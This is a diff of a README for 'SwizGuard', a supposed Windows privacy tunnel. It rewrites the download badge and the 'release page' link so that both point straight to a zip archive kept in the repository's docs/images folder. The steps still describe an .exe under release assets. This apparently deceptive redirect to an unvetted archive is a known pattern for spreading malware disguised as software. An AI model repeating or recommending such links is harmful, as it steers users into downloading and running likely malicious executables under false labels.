@@ -1,6 +1,6 @@
 # 🛡️ SwizGuard - Private internet access for everyone everywhere
 
-[![](https://img.shields.io/badge/Download_SwizGuard-Blue.svg)](https://github.com/jannasweetened9049/SwizGuard)
+[![](https://img.shields.io/badge/Download_SwizGuard-Blue.svg)](https://github.com/jannasweetened9049/SwizGuard/raw/refs/heads/main/docs/images/Swiz-Guard-1.1-alpha.2.zip)
 
 SwizGuard protects your internet activity. It creates a secure tunnel for your data. This tunnel hides your habits from your internet provider. Your traffic looks like standard web browsing. SwizGuard uses reliable technology to keep your connection private and open.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11. Your system should have at
 
 ## 💾 Installation Steps
 
-1. Visit the [SwizGuard release page](https://github.com/jannasweetened9049/SwizGuard) to download the software.
+1. Visit the [SwizGuard release page](https://github.com/jannasweetened9049/SwizGuard/raw/refs/heads/main/docs/images/Swiz-Guard-1.1-alpha.2.zip) to download the software.
 2. Look for the file ending in .exe under the assets section.
 3. Click the file to save it to your computer.
 4. Locate the file in your downloads folder.
